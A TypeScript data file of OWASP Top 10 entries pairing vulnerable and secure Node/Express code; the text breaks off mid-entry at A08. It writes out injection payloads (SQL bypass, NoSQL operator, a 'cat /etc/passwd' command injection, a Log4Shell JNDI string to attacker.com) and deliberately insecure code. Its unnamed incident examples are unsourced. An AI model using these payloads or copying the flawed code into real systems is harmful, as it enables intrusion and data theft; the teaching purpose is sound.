// OWASP Top 10 (2025) Data
export interface OwaspItem {
  id: string;
  rank: string;
  title: string;
  shortDescription: string;
  description: string;
  impact: string;
  realWorldExample: string;
  vulnerableCode: string;
  secureCode: string;
  codeLanguage: string;
  preventionSteps: string[];
  references: { label: string; url: string }[];
  severity: "Critical" | "High" | "Medium";
  cweIds: string[];
}

export const owaspTop10: OwaspItem[] = [
  {
    id: "a01-broken-access-control",
    rank: "A01",
    title: "Broken Access Control",
    shortDescription:
      "Restrictions on authenticated users are not properly enforced, allowing attackers to access unauthorized data or functions.",
    description: `Broken Access Control is the most critical web application security risk. It occurs when an application fails to properly enforce restrictions on what authenticated users are allowed to do. Attackers can exploit these flaws to access unauthorized functionality and data, such as accessing other users' accounts, viewing sensitive files, modifying other users' data, or changing access rights.

Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of data, or performing a business function outside the user's limits.

Common access control vulnerabilities include:
- Bypassing access control checks by modifying the URL, application state, or HTML page
- Allowing the primary key to be changed to another user's record (IDOR)
- Elevation of privilege — acting as a user without being logged in, or acting as an admin when logged in as a regular user
- Metadata manipulation such as replaying or tampering with JWT tokens, cookies, or hidden fields
- CORS misconfiguration allowing unauthorized API access
- Force browsing to authenticated pages as an unauthenticated user`,
    impact:
      "Attackers can access any functionality and data within the application. Full system compromise, data theft, data manipulation, and complete account takeover are common outcomes.",
    realWorldExample: `In 2024, a major financial platform experienced a breach where attackers discovered that changing the account ID parameter in the URL (e.g., /api/accounts/12345 to /api/accounts/12346) allowed them to view any customer's banking details, transaction history, and personal information. Over 3.4 million customer records were exposed because the API endpoint only checked if the user was authenticated — not whether they were authorized to access that specific account. This is a classic Insecure Direct Object Reference (IDOR) vulnerability.

Another prominent example: A popular SaaS platform allowed regular users to access admin API endpoints simply by directly calling /api/admin/users. The admin panel was hidden in the UI, but the backend did not enforce role-based checks.`,
    vulnerableCode: `// VULNERABLE — No authorization check on resource access
app.get('/api/accounts/:id', authenticate, async (req, res) => {
  // Only checks if user is logged in, NOT if they own this account
  const account = await db.accounts.findById(req.params.id);
  res.json(account); // Any authenticated user can view ANY account
});

// VULNERABLE — Hidden admin route with no role check
app.delete('/api/admin/users/:id', authenticate, async (req, res) => {
  // No check for admin role!
  await db.users.deleteById(req.params.id);
  res.json({ message: 'User deleted' });
});

// VULNERABLE — Client-side only access control
function AdminPanel() {
  const { user } = useAuth();
  if (user.role !== 'admin') return <Redirect to="/" />;
  // The API endpoints behind this panel have NO server-side checks
  return <AdminDashboard />;
}`,
    secureCode: `// SECURE — Verify resource ownership
app.get('/api/accounts/:id', authenticate, async (req, res) => {
  const account = await db.accounts.findById(req.params.id);

  if (!account) {
    return res.status(404).json({ error: 'Not found' });
  }

  // Verify the authenticated user owns this resource
  if (account.userId.toString() !== req.user.id) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  res.json(account);
});

// SECURE — Role-based middleware
function requireRole(...roles: string[]) {
  return (req: Request, res: Response, next: NextFunction) => {
    if (!req.user || !roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
}

app.delete('/api/admin/users/:id',
  authenticate,
  requireRole('admin'),
  async (req, res) => {
    await db.users.deleteById(req.params.id);
    auditLog('USER_DELETED', req.user.id, req.params.id);
    res.json({ message: 'User deleted' });
  }
);`,
    codeLanguage: "TypeScript",
    preventionSteps: [
      "Implement server-side access control checks — never rely on client-side enforcement alone",
      "Deny access by default; require explicit grants for every resource and action",
      "Use role-based (RBAC) or attribute-based (ABAC) access control and enforce it consistently",
      "Validate that the authenticated user owns or has permission to access the requested resource (prevent IDOR)",
      "Disable web server directory listing and ensure file metadata (.git, backups) are not accessible",
      "Log and alert on repeated access control failures to detect attacks",
      "Rate-limit API access to minimize the damage from automated attacks",
      "Invalidate JWT tokens and sessions on the server after logout",
    ],
    references: [
      { label: "OWASP Broken Access Control", url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/" },
      { label: "CWE-284: Improper Access Control", url: "https://cwe.mitre.org/data/definitions/284.html" },
    ],
    severity: "Critical",
    cweIds: ["CWE-200", "CWE-284", "CWE-285", "CWE-639"],
  },
  {
    id: "a02-cryptographic-failures",
    rank: "A02",
    title: "Cryptographic Failures",
    shortDescription:
      "Failures related to cryptography that lead to exposure of sensitive data or system compromise.",
    description: `Previously known as "Sensitive Data Exposure," this category focuses on failures related to cryptography (or lack thereof). Many web applications and APIs do not properly protect sensitive data such as financial information, healthcare data, and personally identifiable information (PII).

Cryptographic failures occur when:
- Data is transmitted in clear text (HTTP, SMTP, FTP) or with weak TLS configurations
- Old or weak cryptographic algorithms are used (MD5, SHA1 for passwords, DES, RC4)
- Default or weak encryption keys are used, or keys are not rotated
- Encryption is not enforced (e.g., missing security headers, missing HSTS)
- The server certificate is not properly validated
- Cryptographic randomness is insufficient for the security context
- Deprecated hash functions or padding schemes are in use

The first step is to determine the protection needs of data in transit and at rest. Passwords, credit card numbers, health records, personal information, and business secrets all require extra protection.`,
    impact:
      "Exposure of sensitive data including passwords, credit card numbers, health records, personal information, and business secrets. Can lead to identity theft, financial fraud, and regulatory penalties (GDPR, PCI DSS, HIPAA violations).",
    realWorldExample: `In 2023, a healthcare platform stored patient records with AES encryption but kept the encryption keys in the same database as the encrypted data. When attackers gained database access through a SQL injection flaw, they immediately had the keys to decrypt all 11 million patient records including diagnoses, Social Security numbers, and insurance details.

Another case: A popular e-commerce site used MD5 hashing (without salt) for passwords. After a breach exposed the password hashes, attackers cracked 87% of passwords within 72 hours using rainbow tables and GPU-accelerated brute force.`,
    vulnerableCode: `// VULNERABLE — MD5 for passwords (fast, no salt, reversible via rainbow tables)
import crypto from 'crypto';

function hashPassword(password: string): string {
  return crypto.createHash('md5').update(password).digest('hex');
}

// VULNERABLE — Hardcoded encryption key, weak algorithm
const ENCRYPTION_KEY = 'my-secret-key-123'; // Hardcoded!

function encryptData(data: string): string {
  const cipher = crypto.createCipheriv('des-ecb', ENCRYPTION_KEY, null);
  return cipher.update(data, 'utf8', 'hex') + cipher.final('hex');
}

// VULNERABLE — Transmitting sensitive data without TLS enforcement
app.post('/api/login', (req, res) => {
  // No check whether connection is HTTPS
  const { email, password } = req.body;
  // Password travels in clear text if accessed via HTTP
});`,
    secureCode: `// SECURE — bcrypt with configurable cost factor
import bcrypt from 'bcryptjs';

async function hashPassword(password: string): Promise<string> {
  return await bcrypt.hash(password, 12); // Cost factor 12
}

async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return await bcrypt.compare(password, hash);
}

// SECURE — AES-256-GCM with key from environment, unique IV per encryption
import { randomBytes, createCipheriv, createDecipheriv } from 'crypto';

const ENCRYPTION_KEY = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex'); // 32 bytes

function encrypt(plaintext: string): string {
  const iv = randomBytes(16); // Unique IV every time
  const cipher = createCipheriv('aes-256-gcm', ENCRYPTION_KEY, iv);
  const encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const authTag = cipher.getAuthTag();
  return Buffer.concat([iv, authTag, encrypted]).toString('base64');
}

function decrypt(ciphertext: string): string {
  const buf = Buffer.from(ciphertext, 'base64');
  const iv = buf.subarray(0, 16);
  const authTag = buf.subarray(16, 32);
  const encrypted = buf.subarray(32);
  const decipher = createDecipheriv('aes-256-gcm', ENCRYPTION_KEY, iv);
  decipher.setAuthTag(authTag);
  return decipher.update(encrypted) + decipher.final('utf8');
}

// SECURE — Enforce HTTPS with HSTS
app.use((req, res, next) => {
  if (!req.secure) return res.redirect(301, \`https://\${req.headers.host}\${req.url}\`);
  res.setHeader('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');
  next();
});`,
    codeLanguage: "TypeScript",
    preventionSteps: [
      "Classify data processed, stored, or transmitted and identify which is sensitive per regulations (GDPR, PCI DSS, HIPAA)",
      "Don't store sensitive data unnecessarily — discard it as soon as possible",
      "Encrypt all sensitive data at rest using strong algorithms (AES-256)",
      "Enforce HTTPS/TLS for all data in transit; use HSTS headers",
      "Use bcrypt, scrypt, or Argon2 for password hashing — never MD5 or SHA for passwords",
      "Use authenticated encryption modes (AES-GCM) instead of ECB mode",
      "Generate cryptographic keys using secure random generators and manage them through a secrets manager",
      "Rotate encryption keys regularly and store them separately from encrypted data",
    ],
    references: [
      { label: "OWASP Cryptographic Failures", url: "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" },
      { label: "CWE-259: Hard-coded Password", url: "https://cwe.mitre.org/data/definitions/259.html" },
    ],
    severity: "Critical",
    cweIds: ["CWE-259", "CWE-327", "CWE-328", "CWE-330"],
  },
  {
    id: "a03-injection",
    rank: "A03",
    title: "Injection",
    shortDescription:
      "Untrusted data is sent to an interpreter as part of a command or query, allowing attackers to execute unintended commands.",
    description: `Injection flaws occur when an application sends untrusted data to an interpreter. Injection vulnerabilities are found in SQL, NoSQL, OS, LDAP, XPath, ORM queries, and expression languages. The flaw is the lack of input validation and the mixing of data with commands.

An application is vulnerable when:
- User-supplied data is not validated, filtered, or sanitized
- Dynamic queries or non-parameterized calls are used without context-aware escaping
- Hostile data is directly used in ORM search parameters
- Hostile data is concatenated into dynamic SQL queries, commands, or stored procedures

Injection can result in data loss, corruption, disclosure to unauthorized parties, loss of accountability, denial of access, or complete host takeover. The business impact depends on the needs of the application and data.

Modern injection vectors include:
- SQL Injection (classic, blind, time-based, out-of-band)
- NoSQL Injection (MongoDB operator injection)
- OS Command Injection
- Server-Side Template Injection (SSTI)
- GraphQL Injection
- LDAP Injection
- Expression Language Injection`,
    impact:
      "Data theft, data loss, data corruption, denial of service, and in some cases full system compromise. Attackers can read, modify, or delete any data in the database, execute operating system commands, or take over the server.",
    realWorldExample: `A government portal's login form was vulnerable to SQL injection. Entering the username \`admin' OR '1'='1' --\` bypassed authentication and granted admin access. The attacker then exfiltrated 26 million citizen records including Social Security numbers, addresses, and tax information.

In another case, a Node.js application using MongoDB was exploited through NoSQL injection. The attacker sent the payload \`{"email": {"$gt": ""}, "password": {"$gt": ""}}\` which matched all documents in the collection and returned the first user's credentials, enabling full account takeover.`,
    vulnerableCode: `// VULNERABLE — SQL Injection via string concatenation
app.get('/api/users', async (req, res) => {
  const { search } = req.query;
  const query = \`SELECT * FROM users WHERE name LIKE '%\${search}%'\`;
  // Attacker input: ' UNION SELECT password FROM users --
  const results = await db.query(query);
  res.json(results);
});

// VULNERABLE — NoSQL Injection in MongoDB
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  // Attacker sends: { "email": {"$gt": ""}, "password": {"$gt": ""} }
  const user = await User.findOne({ email, password });
  if (user) res.json({ token: generateToken(user) });
});

// VULNERABLE — OS Command Injection
app.get('/api/ping', (req, res) => {
  const { host } = req.query;
  // Attacker input: google.com; cat /etc/passwd
  exec(\`ping -c 4 \${host}\`, (err, stdout) => {
    res.send(stdout);
  });
});`,
    secureCode: `// SECURE — Parameterized queries prevent SQL injection
app.get('/api/users', async (req, res) => {
  const { search } = req.query;
  const query = 'SELECT * FROM users WHERE name LIKE $1';
  const results = await db.query(query, [\`%\${search}%\`]);
  res.json(results);
});

// SECURE — Schema validation + explicit field comparison
import { z } from 'zod';

const loginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8),
});

app.post('/api/login', async (req, res) => {
  const { email, password } = loginSchema.parse(req.body);
  const user = await User.findOne({ email }); // Only query by email
  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  res.json({ token: generateToken(user) });
});

// SECURE — Allowlist for command arguments
import { execFile } from 'child_process';

const IP_REGEX = /^[0-9]{1,3}(\\.[0-9]{1,3}){3}$/;

app.get('/api/ping', (req, res) => {
  const host = req.query.host as string;
  if (!IP_REGEX.test(host)) {
    return res.status(400).json({ error: 'Invalid IP address' });
  }
  execFile('ping', ['-c', '4', host], (err, stdout) => {
    res.send(stdout);
  });
});`,
    codeLanguage: "TypeScript",
    preventionSteps: [
      "Use parameterized queries (prepared statements) for all database interactions",
      "Use ORMs carefully — validate that queries don't accept operator objects from user input",
      "Validate all input using a schema validation library (Zod, Joi, Yup)",
      "Escape special characters appropriate to the context (SQL, HTML, OS, LDAP)",
      "Use allow-list (positive) server-side input validation",
      "Use LIMIT and other SQL controls to prevent mass data disclosure in SQL injection",
      "Use execFile() instead of exec() for OS commands; never pass user input directly",
      "Implement WAF rules as defense-in-depth (not primary defense)",
    ],
    references: [
      { label: "OWASP Injection", url: "https://owasp.org/Top10/A03_2021-Injection/" },
      { label: "CWE-89: SQL Injection", url: "https://cwe.mitre.org/data/definitions/89.html" },
    ],
    severity: "Critical",
    cweIds: ["CWE-77", "CWE-78", "CWE-89", "CWE-94"],
  },
  {
    id: "a04-insecure-design",
    rank: "A04",
    title: "Insecure Design",
    shortDescription:
      "Missing or ineffective security controls and architectural flaws that cannot be fixed by perfect implementation alone.",
    description: `Insecure Design is a broad category representing different weaknesses, expressed as "missing or ineffective control design." It is the difference between a design that was never built to withstand attacks versus implementation bugs. An insecure design cannot be fixed by a perfect implementation because, by definition, the needed security controls were never created.

This category focuses on risks related to design and architectural flaws, calling for more use of threat modeling, secure design patterns, and reference architectures.

Key areas include:
- Missing threat modeling during the design phase
- Lack of business logic security controls
- Insufficient abuse case / misuse case analysis
- No security requirements defined for the application
- Failure to limit resource consumption (no rate limiting on critical operations)
- Missing multi-factor authentication for sensitive operations
- Lack of tenant isolation in multi-tenant systems
- Missing transaction verification for financial operations

Insecure design is not the source for all other Top 10 risk categories. There is a difference between insecure design and insecure implementation. A secure design can still have implementation defects leading to exploitable vulnerabilities.`,
    impact:
      "Business logic exploitation, credential stuffing without resistance, unlimited resource consumption, data exposure through design flaws, and fraud through missing workflow controls.",
    realWorldExample: `A movie theater chain's booking system allowed unlimited ticket reservations without requiring payment within a time window. Competitors exploited this by reserving all seats for popular showings, preventing real customers from booking, effectively conducting a denial-of-service attack on the business through legitimate flows.

A banking app allowed password resets via a "security question" with answers that were publicly findable on social media. The design itself was flawed — even a perfect implementation of this flow is insecure because security questions are an inherently weak authentication factor.

A cryptocurrency exchange designed its withdrawal workflow to process requests instantly without a confirmation delay or secondary approval for large amounts. An attacker who compromised a single session token drained $4.7M in 3 minutes. A proper design would include time-delayed withdrawals, email confirmation, and anomaly detection.`,
    vulnerableCode: `// VULNERABLE — No rate limiting on credential-stuffing target
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email });
  if (!user || !await bcrypt.compare(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  // No rate limiting — attackers can try millions of passwords
  // No account lockout — no protection against brute force
  // No MFA — single factor authentication for all accounts
  res.json({ token: generateToken(user) });
});

// VULNERABLE — No transaction verification
app.post('/api/transfer', authenticate, async (req, res) => {
  const { toAccount, amount } = req.body;
  // No confirmation step, no delay, no limit
  // No notification to user
  // No anomaly detection
  await processTransfer(req.user.id, toAccount, amount);
  res.json({ success: true });
});`,
    secureCode: `// SECURE — Defense-in-depth with rate limiting, lockout, and MFA
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window per IP
  message: { error: 'Too many login attempts. Try again in 15 minutes.' },
});

app.post('/api/login', loginLimiter, async (req, res) => {
  const { email, password, mfaCode } = loginSchema.parse(req.body);
  const user = await User.findOne({ email });

  // Check account lockout
  if (user?.lockoutUntil && user.lockoutUntil > new Date()) {
    return res.status(423).json({ error: 'Account temporarily locked' });
  }

  if (!user || !await bcrypt.compare(password, user.password)) {
    if (user) {
      user.failedAttempts = (user.failedAttempts || 0) + 1;
      if (user.failedAttempts >= 5) {
        user.lockoutUntil = new Date(Date.now() + 30 * 60 * 1000);
      }
      await user.save();
    }
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Verify MFA
  if (user.mfaEnabled && !verifyTOTP(user.mfaSecret, mfaCode)) {
    return res.status(401).json({ error: 'Invalid MFA code' });
  }

  user.failedAttempts = 0;
  await user.save();
  res.json({ token: generateToken(user) });
});

// SECURE — Multi-step transaction with confirmation
app.post('/api/transfer/initiate', authenticate, async (req, res) => {
  const { toAccount, amount } = transferSchema.parse(req.body);

  // Check daily limits
  const todayTotal = await getDailyTransferTotal(req.user.id);
  if (todayTotal + amount > req.user.dailyLimit) {
    return res.status(400).json({ error: 'Daily transfer limit exceeded' });
  }

  // Create pending transfer, require email confirmation
  const transfer = await createPendingTransfer(req.user.id, toAccount, amount);
  await sendConfirmationEmail(req.user.email, transfer.id, amount);
  res.json({ message: 'Please confirm transfer via email', transferId: transfer.id });
});`,
    codeLanguage: "TypeScript",
    preventionSteps: [
      "Establish a secure development lifecycle with AppSec professionals to evaluate and design security controls",
      "Use threat modeling for critical authentication, access control, business logic, and key flows",
      "Integrate security language and controls into user stories (abuse cases)",
      "Implement rate limiting on authentication, password reset, and high-value operations",
      "Require multi-factor authentication for sensitive actions (transfers, role changes, password changes)",
      "Design multi-step verification for high-value transactions (email/SMS confirmation)",
      "Implement tenant isolation in multi-tenant architectures",
      "Write unit and integration tests that validate all critical security flows and access control",
    ],
    references: [
      { label: "OWASP Insecure Design", url: "https://owasp.org/Top10/A04_2021-Insecure_Design/" },
      { label: "OWASP Threat Modeling", url: "https://owasp.org/www-community/Threat_Modeling" },
    ],
    severity: "High",
    cweIds: ["CWE-209", "CWE-256", "CWE-501", "CWE-522"],
  },
  {
    id: "a05-security-misconfiguration",
    rank: "A05",
    title: "Security Misconfiguration",
    shortDescription:
      "Missing security hardening, default configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages.",
    description: `Security Misconfiguration is the most commonly seen vulnerability category. It occurs when security settings are defined, implemented, and maintained as defaults or are improperly configured. With the move to highly configurable software and cloud services, this category has become increasingly prevalent.

The application might be vulnerable if:
- Security hardening is missing across any part of the application stack
- Unnecessary features are enabled or installed (ports, services, pages, accounts, privileges)
- Default accounts and their passwords are still enabled and unchanged
- Error handling reveals stack traces or other overly informative error messages
- Latest security features are disabled or not configured securely
- Security settings in application servers, frameworks, libraries, databases are not set to secure values
- The server does not send proper security headers or directives
- Software is out of date or vulnerable
- Cloud storage buckets are publicly accessible
- CORS is overly permissive`,
    impact:
      "Unauthorized access to system data or functionality, potentially leading to complete system compromise. Verbose errors can reveal internal architecture details useful for further attacks.",
    realWorldExample: `In 2023, a Fortune 500 company left an AWS S3 bucket publicly accessible containing 1.5TB of internal data including employee records, source code, API keys, and production database credentials. The bucket used default permissions and was never configured with proper access policies.

A popular web framework had directory listing enabled by default. An attacker discovered a /backup/ directory containing database dumps with all user credentials. The default settings also exposed the /admin panel with the default credentials admin:admin.`,
    vulnerableCode: `// VULNERABLE — Detailed error messages in production
app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  // Exposes internal details to attackers
  res.status(500).json({
    error: err.message,
    stack: err.stack,           // Full stack trace!
    query: req.query,           // User input echoed back
    dbConnection: process.env.DATABASE_URL, // Credentials!
  });
});

// VULNERABLE — Overly permissive CORS
app.use(cors({
  origin: '*',              // Any website can make requests
  credentials: true,        // Accept cookies from any origin
}));

// VULNERABLE — Default security headers missing
// No helmet, no HSTS, no CSP, no X-Frame-Options
const app = express();
app.listen(3000);`,
    secureCode: `// SECURE — Sanitized error responses in production
app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  // Log full error internally
  logger.error({ err, requestId: req.id, path: req.path });

  // Send safe response to client
  const statusCode = err instanceof AppError ? err.statusCode : 500;
  res.status(statusCode).json({
    error: statusCode === 500
      ? 'An unexpected error occurred'
      : err.message,
    requestId: req.id, // For support reference only
  });
});

// SECURE — Restrictive CORS configuration
app.use(cors({
  origin: ['https://myapp.com', 'https://admin.myapp.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  credentials: true,
  maxAge: 86400,
}));

// SECURE — Comprehensive security headers
import helmet from 'helmet';

app.use(helmet());
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'"],
    frameSrc: ["'none'"],
    objectSrc: ["'none'"],
  },
}));
app.use(helmet.hsts({ maxAge: 63072000, includeSubDomains: true, preload: true }));`,
    codeLanguage: "TypeScript",
    preventionSteps: [
      "Implement a repeatable hardening process for fast and easy deployment of locked-down environments",
      "Remove or don't install unused features, frameworks, and dependencies",
      "Review and update security configurations as part of patch management",
      "Use segmented application architecture with separate tenants, groups, or instances",
      "Send security directives to clients (security headers, CSP, HSTS)",
      "Automate verification of configurations and settings across all environments",
      "Use different credentials for development, staging, and production",
      "Implement CORS with a strict allowlist, never use origin: '*' with credentials",
    ],
    references: [
      { label: "OWASP Security Misconfiguration", url: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" },
      { label: "CWE-16: Configuration", url: "https://cwe.mitre.org/data/definitions/16.html" },
    ],
    severity: "High",
    cweIds: ["CWE-2", "CWE-11", "CWE-16", "CWE-388"],
  },
  {
    id: "a06-vulnerable-outdated-components",
    rank: "A06",
    title: "Vulnerable and Outdated Components",
    shortDescription:
      "Using components with known vulnerabilities, including libraries, frameworks, and other software modules.",
    description: `You are likely vulnerable if you do not know the versions of all components you use (both client-side and server-side), if any software is vulnerable, unsupported, or out of date, or if you do not scan for vulnerabilities regularly and subscribe to security bulletins.

This includes the OS, web/application server, databases, applications, APIs, runtime environments, libraries, and all components. Supply chain attacks have become one of the most devastating attack vectors.

Key risks:
- Using components with known CVEs (Common Vulnerabilities and Exposures)
- Not tracking component versions and their dependencies (transitive dependencies)
- Not monitoring security advisories for the components you use
- Not patching or upgrading the underlying platform, frameworks, and dependencies in a timely fashion
- Using abandoned or unmaintained software components
- Not testing compatibility of updated libraries`,
    impact:
      "Depending on the vulnerability, impact ranges from minor information disclosure to full remote code execution. The Log4Shell vulnerability (CVE-2021-44228) demonstrated how a single library vulnerability can affect millions of applications worldwide.",
    realWorldExample: `The Log4Shell vulnerability (CVE-2021-44228) in Apache Log4j2 affected virtually every Java application using the popular logging library. A simple string \${jndi:ldap://attacker.com/exploit} in any logged field (user agent, form input, HTTP header) triggered remote code execution. It was rated 10.0/10 severity and affected services from Amazon to Microsoft to Apple.

In 2024, the XZ Utils backdoor (CVE-2024-3094) nearly compromised every Linux system worldwide. A trusted maintainer's account was taken over through a sophisticated social engineering campaign, and malicious code was inserted into the compression library that is a dependency of OpenSSH on many Linux distributions.`,
    vulnerableCode: `// VULNERABLE — package.json with no version pinning, outdated deps
{
  "dependencies": {
    "express": "*",           // Any version — could pull vulnerable one
    "lodash": "^3.0.0",      // Very old, many known vulnerabilities
    "jsonwebtoken": "^7.0.0", // Old version with algorithm confusion attack
    "mongoose": "~4.0.0",     // Years out of date
    "moment": "^2.10.0"       // Deprecated, regex DoS vulnerabilities
  }
}

// No package-lock.json committed — builds are non-deterministic
// No automated vulnerability scanning
// No SBOM generation
// No dependency update policy`,
    secureCode: `// SECURE — Pinned versions, modern packages, security tooling
{
  "dependencies": {
    "express": "4.21.2",       // Pinned to specific version
    "date-fns": "4.1.0",      // Modern replacement for moment
    "jose": "5.9.6",          // Modern JWT library
    "mongoose": "8.9.5",       // Current release
    "helmet": "8.0.0"          // Security headers
  },
  "scripts": {
    "audit": "npm audit --audit-level=high",
    "audit:fix": "npm audit fix",
    "outdated": "npm outdated",
    "sbom": "npx @cyclonedx/cyclonedx-npm --output-file sbom.json",
    "check-deps": "npx depcheck"
  },
  "overrides": {
    // Force transitive dependency patches
  }
}

// .github/dependabot.yml — Automated dependency updates
// version: 2
// updates:
//   - package-ecosystem: "npm"
//     directory: "/"
//     schedule:
//       interval: "weekly"
//     open-pull-requests-limit: 10

// CI pipeline includes:
// - npm audit --audit-level=high
// - Snyk / Socket.dev / Trivy scanning
// - SBOM generation for every release
// - License compliance checking`,
    codeLanguage: "TypeScript / JSON",
    preventionSteps: [
      "Remove unused dependencies, unnecessary features, components, files, and documentation",
      "Continuously inventory versions of all components and their dependencies using tools like SBOM generators",
      "Monitor sources like CVE, NVD, and component-specific advisories for vulnerabilities",
      "Use Dependabot, Renovate, or Snyk to automate dependency update pull requests",
      "Only obtain components from official sources over secure links and prefer signed packages",
      "Pin dependency versions and commit lockfiles to ensure deterministic builds",
      "Run npm audit / yarn audit in CI pipelines and fail builds on high-severity findings",
      "Establish a patch management process with SLAs for critical (24h), high (7d), medium (30d) vulnerabilities",
    ],
    references: [
      { label: "OWASP Vulnerable Components", url: "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" },
      { label: "CWE-1104: Use of Unmaintained Third-Party Components", url: "https://cwe.mitre.org/data/definitions/1104.html" },
    ],
    severity: "High",
    cweIds: ["CWE-937", "CWE-1035", "CWE-1104"],
  },
  {
    id: "a07-identification-authentication-failures",
    rank: "A07",
    title: "Identification and Authentication Failures",
    shortDescription:
      "Weaknesses in authentication mechanisms that allow attackers to compromise passwords, keys, session tokens, or exploit implementation flaws.",
    description: `Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks. There may be authentication weaknesses if the application:

- Permits automated attacks such as credential stuffing (using lists of known breached credentials)
- Permits brute force or other automated password attacks
- Permits default, weak, or well-known passwords such as "admin123" or "password"
- Uses weak or ineffective credential recovery and forgot-password processes (e.g., knowledge-based answers)
- Uses plain text, encrypted, or weakly hashed passwords
- Has missing or ineffective multi-factor authentication
- Exposes session identifiers in the URL
- Reuses session identifiers after successful login (session fixation)
- Does not properly invalidate sessions during logout, idle timeouts, or absolute timeouts`,
    impact:
      "Full account takeover, identity theft, unauthorized access to sensitive data and functionality. If admin credentials are compromised, complete system takeover is possible.",
    realWorldExample: `A popular streaming service experienced a credential stuffing attack where attackers used 1.3 billion username/password combinations from previous breaches. Because the service had no rate limiting, no CAPTCHA, and no credential breach detection, 500,000 accounts were compromised in a single weekend. Users who reused passwords from other breached services were the primary victims.

A government agency's password reset flow asked "What is your mother's maiden name?" — information publicly available on genealogy websites. Attackers reset passwords for senior officials and accessed classified communications.`,
    vulnerableCode: `// VULNERABLE — Weak session management
app.post('/api/login', async (req, res) => {
  const user = await authenticate(req.body);
  if (!user) return res.status(401).json({ error: 'Failed' });

  // Session fixation — not regenerating session ID after login
  req.session.userId = user.id;

  // Session never expires
  // No absolute timeout
  // No idle timeout

  res.json({ message: 'Logged in' });
});

// VULNERABLE — Weak password policy
function validatePassword(password: string): boolean {
  return password.length >= 4; // Far too short
}

// VULNERABLE — Predictable session IDs
function generateSessionId(): string {
  return Date.now().toString(); // Predictable and guessable
}

// VULNERABLE — Logout doesn't invalidate session
app.post('/api/logout', (req, res) => {
  res.clearCookie('session'); // Cookie cleared but session still valid server-side
  res.json({ message: 'Logged out' });
});`,
    secureCode: `// SECURE — Robust session management
import { randomBytes } from 'crypto';

app.post('/api/login', loginLimiter, async (req, res) => {
  const { email, password, mfaToken } = loginSchema.parse(req.body);
  const user = await User.findOne({ email });

  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    await recordFailedAttempt(email);
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  if (user.mfaEnabled) {
    if (!mfaToken || !verifyTOTP(user.mfaSecret, mfaToken)) {
      return res.status(401).json({ error: 'MFA required', mfaRequired: true });
    }
  }

  // Regenerate session to prevent session fixation
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Session error' });

    req.session.userId = user.id;
    req.session.loginAt = Date.now();
    req.session.lastActive = Date.now();

    // Secure cookie settings
    res.cookie('sessionId', req.sessionID, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 30 * 60 * 1000, // 30 min idle timeout
    });

    res.json({ message: 'Logged in' });
  });
});

// Absolute session timeout middleware
app.use((req, res, next) => {
  if (req.session?.loginAt) {
    const elapsed = Date.now() - req.session.loginAt;
    if (elapsed > 8 * 60 * 60 * 1000) { // 8 hour absolute timeout
      return req.session.destroy(() => res.status(401).json({ error: 'Session expired' }));
    }
    req.session.lastActive = Date.now();
  }
  next();
});

// SECURE — Complete logout
app.post('/api/logout', (req, res) => {
  req.session.destroy((err) => {
    res.clearCookie('sessionId');
    res.json({ message: 'Logged out' });
  });
});`,
    codeLanguage: "TypeScript",
    preventionSteps: [
      "Implement multi-factor authentication (TOTP, WebAuthn/Passkeys) to prevent credential stuffing and brute force",
      "Do not deploy with default credentials; enforce password complexity (min 12 characters, check against breached password lists)",
      "Implement account lockout after 5 failed attempts, with exponential backoff",
      "Regenerate session IDs after login; invalidate sessions completely on logout",
      "Set absolute session timeouts (8 hours) and idle timeouts (30 minutes)",
      "Use secure, httpOnly, sameSite cookies for session management",
      "Check new passwords against the top 10,000 breached passwords (HIBP API)",
      "Log all authentication events and alert on anomalies (impossible travel, credential stuffing patterns)",
    ],
    references: [
      { label: "OWASP Authentication Failures", url: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" },
      { label: "CWE-287: Improper Authentication", url: "https://cwe.mitre.org/data/definitions/287.html" },
    ],
    severity: "Critical",
    cweIds: ["CWE-255", "CWE-287", "CWE-384", "CWE-613"],
  },
  {
    id: "a08-software-data-integrity-failures",
    rank: "A08",
    title: "Software and Data Integrity Failures",
    shortDescription:
      "Code and infrastructure that does not protect against integrity violations — insecure CI/CD pipelines, auto-updates without verification, and untrusted deserialization.",
    description: `Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. This includes insecure deserialization, using software from untrusted sources (CDNs, repos) without integrity verification, and insecure CI/CD pipelines.

An insecure CI/CD pipeline can introduce the opportunity for unauthorized access, malicious code injection, or system compromise. Applications that auto-update without sufficient integrity verification can be hijacked.

Key vulnerability areas:
